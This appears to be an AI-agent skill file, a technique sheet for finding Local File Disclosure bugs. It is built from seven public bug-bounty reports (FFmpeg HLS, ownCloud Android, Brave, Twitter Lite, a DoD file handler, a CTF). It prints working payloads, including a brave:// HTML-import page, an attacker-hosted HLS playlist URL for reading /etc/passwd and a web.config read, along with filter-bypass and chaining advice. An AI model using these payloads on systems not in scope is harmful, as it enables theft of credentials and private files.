---
name: hunter-l3-local-file-disclosure
description: "Use when hunting Local File Disclosure on a target. Loads the L3 technique sheet: Local File Disclosure (LFD) covers any bug where an attacker causes a server or client application to read and return the contents of files it should not expose — server-side templates and handlers (`"
domain: cybersecurity
subdomain: web
tags:
- web
- local-file-disclosure
- hunting
- l3
version: '1.0'
---

# Local File Disclosure — Technique Sheet

## Overview

Local File Disclosure (LFD) covers any bug where an attacker causes a server or client application to read and return the contents of files it should not expose — server-side templates and handlers (`file.ashx?path=`, `?template=` filters), embedded media-processing pipelines (FFmpeg HLS), browser/protocol origins importing local files (`brave://`), and Android activities accepting `file://` URIs. It pays when the disclosed file yields immediate credentials or flags (web.config with DB creds, `/etc/passwd`, app databases) or when it becomes the pivot for full account takeover. The class spans trivially misconfigured file handlers to multi-step protocol/origin bypasses, so test both "dumb parameter" and "clever chain" angles.

## Distinct sub-patterns

### 1. Nested-string bypass of sequential `str_replace` filters (template/LFI filter evasion)

- Endpoint shape: `GET /my-diary/?template=<filename>` (server-side include of a file named by the `template` parameter).
- Payload that actually fired (verbatim):
  - `secretasecretaadmin.phpdmin.phpdmin.php`
  - `secretasecretadadmin.phpmin.phpdmin.php`
- Root cause: The app blocks the target filename using multiple sequential one-pass `str_replace` calls. Because each pass runs only once, nesting copies of the blocked string inside itself means pass N partially matches and strips a substring, and the remains of the surrounding nesting recombine on pass N+1 (or after the final pass) to reconstruct the blocked name. Both payloads resolve to `secretadmin.php` after the filter chain.
- Impact: Read the contents of `secretadmin.php` (the "Grinch" admin page/panel) and retrieved the flag. In CTF programs this was the entire win; the same construction generalizes to any `str_replace`-based blacklist (e.g. `../` filters, `config` filters).
- Exemplars: 1067443, 1067835 (Shopify h1-ctf).

Construction note (derived from the two payloads): surround the blocked token with two copies of itself, each missing one or more characters that a later replace pass restores. A practical craft loop: identify the blocked string S (here `secretadmin.php` — or its pieces `secret`, `admin.php`), write the payload as nested near-copies, diff which characters survive each strip, and iterate. The two accepted payloads differ in how the nesting is staggered, confirming multiple nestings resolve to the same target.

### 2. FFmpeg HLS playlist → arbitrary local file read (media-conversion SSRF/LFD)

- Endpoint shape: `POST /media/videos/{blog}` — an upload/convert endpoint (Automattic/WordPress.com video pipeline) that accepts video files and processes them through FFmpeg, including HLS playlists.
- Payload that actually fired: an HLS playlist URL pointing at the attacker's server, `http://<external-ip-of-your-server>:8080/initial.m3u?filename=/etc/passwd` — i.e., upload an AVI whose source is a remote m3u you control; your playlist references `file:///etc/passwd` (or any local path) as a segment.
- Root cause: FFmpeg's HLS demuxer follows segment entries in the playlist and reads whatever URI they name, including `file://` paths on the conversion node. The conversion service never restricted playlist entries to network URLs / the upload directory.
- Impact: Dumped local files from the FFmpeg conversion node — `/etc/issue` (`Debian GNU/Linux 8`) and `/etc/hostname` (`tc1.videos.dca.wordpress.com`), demonstrating internal-infrastructure leakage, in addition to `/etc/passwd`.
- Chain: run `file_reading_server.py` to serve a malicious HLS playlist that reads `/etc/passwd` (or any file) → upload an AVI pointing at `http://<external-ip>:8080/initial.m3u?filename=/etc/passwd` → receive the file contents echoed back through the transcoded output (or read them from the resulting segments).
- Exemplar: 237381 (Automattic).

### 3. Android path-alias bypass on an exported activity (`/data/user/0/` vs `/data/data/`)

- Endpoint shape: exported Android activity `ReceiveExternalFilesActivity` (ownCloud Android app) reached via a `SEND` intent; the attacker-controlled parameter is `android.intent.extra.STREAM` holding a file URI.
- Payload that actually fired: `Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist")` — a `file://` URI using the `/data/user/0/` path form, delivered via the SEND intent.
- Root cause: The activity validates that the requested path is not under `/data/data/`, but Android exposes the same per-app private directory through the alias `/data/user/0/`. The blocklist check misses the alias, so the protection is bypassed wholesale.
- Impact: Attacker-controlled app can make ownCloud read/hand out any protected file under `/data/data/com.owncloud.android/` — confirmed retrieval of the filelist SQLite database and full account data (credentials/sessions).
- Chain: send `file://` URI to the exported `ReceiveExternalFilesActivity` → bypass the `/data/data/` check via the `/data/user/0/` alias → retrieve protected files including the app database.
- Exemplar: 377107 (ownCloud).

### 4. Browser custom-scheme origin confusion (`brave://` as an importable "document")

- Endpoint shape: `brave:///etc/passwd` referenced from an HTML page via an HTML import.
- Payload that actually fired (verbatim, used in both reports):
```html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```
- Root cause (two variants, one fix each):
  - Web-origin variant: the `brave://` custom scheme was treated as an importable document by web pages; a page loaded from the internet could `rel="import"` it and read the rendered body of the local file.
  - Incomplete-fix variant: the first patch blocked imports only from web origins, but `file://` and `brave://` were both treated as local origins — so a page loaded from `file://` could still import `brave://` content.
- Impact: A normal web page (or a local HTML file, post-fix) alerts with / reads the contents of `/etc/passwd` on the victim device.
- Chain: none needed beyond hosting the payload page (or delivering an HTML file).
- Exemplars: 390013 (web origin), 390362 (file:// origin after first fix — a regression-class re-bug worth re-testing after every "fix").

### 5. Exported activity accepting unvalidated intent data URIs (`file:` scheme)

- Endpoint shape: exported activity launched via `adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity` — equivalently, any malicious app can fire the same intent; the attacker-controlled parameter is the intent data URI.
- Payload that actually fired (verbatim):
  `adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "file:///sdcard/BugBounty/1.html"`
- Root cause: `TwitterLiteActivity` is exported and accepts arbitrary intent data URIs without scheme/path validation, including `file:` — the app then loads/renders the referenced local file in its privileged context.
- Impact: A malicious (unprivileged) app can steal the user's local files from the device by pointing the activity at them.
- Exemplar: 499348 (X / Twitter Lite).

### 6. Session-hijack XSS chain ending in file/token exfiltration

- Endpoint shape: airOS v6.2.0 management endpoints (device families TI/XW/XM) containing reflected XSS and missing request protections; no single file-read parameter — the LFD is the terminus of a session-abuse chain.
- Payload: none stated in the record (the record's payload field is empty).
- Root cause: Reflected XSS plus missing CSRF/origin protections let an attacker abuse an authenticated admin's session from a malicious page.
- Impact: Arbitrary actions as the admin, configuration modification, arbitrary firmware upload, and exfiltration of files and tokens — full admin account takeover of the device.
- Chain: authenticated admin visits attacker page (reflected XSS) → attacker abuses the live session → performs arbitrary actions / modifies config / uploads firmware / exfiltrates files and tokens.
- Exemplar: 661647 (Ubiquiti).

### 7. Unrestricted path parameter on a file-handler endpoint

- Endpoint shape: `GET /file.ashx?path=<server-relative-path>` (ASP.NET handler, DoD target).
- Payload that actually fired (verbatim): `https://█████/file.ashx?path=web.config` — note: no `../`, no scheme, just a bare server-relative filename; the handler's intended use was to serve allowed files, so no traversal was needed.
- Root cause: `file.ashx` returns any server-side file named in the `path` parameter with no allowlist or directory restriction.
- Impact: Proven download of `web.config` exposing database credentials and application source code (e.g. `index.aspx`).
- Chain: none needed.
- Exemplar: 685344 (U.S. Dept Of Defense).

## Bypass / chain notes

- Blacklist-vs-parser asymmetry is the recurring theme. Two concrete bypass families in the records:
  - One-pass sequential `str_replace`: nest the blocked string inside mutated copies of itself so later passes recombine into the target (sub-pattern 1). If you see evidence of a filename blacklist (a 200 on benign names, a block/403 on the sensitive name), try nested self-referential variants before giving up.
  - Path aliasing: when a validator string-matches one canonical path (`/data/data/`), try the OS aliases (`/data/user/0/` on Android). Equivalent resource, different string.
- Origin-confusion double-hop: when a custom/local scheme is patched against web origins, immediately retry from a `file://` origin — both were "local" in Brave, so fix #1 was incomplete (390362).
- File-read-through-media-chain: when a service shells out to FFmpeg/ffmpeg-adjacent tooling and accepts remote media URLs, an attacker-hosted playlist can convert into a full file-read primitive; the exfil channel is the attacker-controlled playlist server, so the read is interactive (`?filename=` parameter).
- Android chains: exported-activity + unvalidated URI data (499348) or + SEND intent with `file://` STREAM (377107) — no code execution in the target needed; the privileged app does the reading.
- XSS→file exfil: LFD need not be a file parameter. A reflected XSS on a management surface plus a live admin session was enough to exfiltrate files and tokens on airOS (661647).

## Gotchas / what NOT to do

- Don't only test `../` traversal. Record 685344 needed a bare relative filename (`path=web.config`) — the vulnerability was "handler serves anything", not "insufficient normalization". Test the parameter's intended directory first, then siblings.
- Don't assume a blacklist fix is a fix. Sequential one-pass replacements are trivially nestable; and origin allowlists that don't cover all local origins (`file://` vs `brave://`) leave a regression hole. Re-test after every published fix.
- Don't overlook path aliases on mobile. Matching `/data/data/` string-wise is not path containment — `/data/user/0/` is the same directory.
- Don't ignore custom schemes in browsers. `brave:///etc/passwd` is a URL; test whether it can be fetched, imported (`rel=import`), or embedded from web and file origins.
- Don't assume media converters are safe. A playlist/manifest format that supports local file references is an LFD gadget even if the upload endpoint looks like "video only".
- Payload hygiene: records 661647 (Ubiquiti) and 237381 (partially) have no/stated payload in the record — where a payload isn't stated, reconstruct from root cause rather than guessing blindly, and note it as untested.
- For CTF-style targets (my-diary), the payload is filename-shaped, not path-shaped: the target was a known-adjacent filename (`secretadmin.php`), not `/etc/passwd`. Enumerate candidate filenames before crafting bypasses.

## Real-world impact examples

- web.config with DB credentials and source code exfiltrated from a DoD web app via `file.ashx?path=web.config` (685344).
- `/etc/passwd`, `/etc/issue`, and internal hostname `tc1.videos.dca.wordpress.com` dumped from a WordPress.com FFmpeg conversion node, exposing internal infra naming (237381).
- Full extraction of ownCloud Android's private app database (`filelist`) and all account data via `/data/user/0/` alias on the exported activity (377107).
- Local `/etc/passwd` read from a remote web page (and later from a `file://` page post-fix) in Brave via `brave://` HTML import (390013, 390362).
- Arbitrary local file theft from a user's device by any unprivileged app via Twitter Lite's exported activity (499348).
- Admin account takeover with config modification, arbitrary firmware upload, and file/token exfiltration on Ubiquiti airOS via XSS session abuse (661647).
- Flag retrieval from `secretadmin.php` in the h1 CTF via nested-str_replace filter bypass (1067443, 1067835).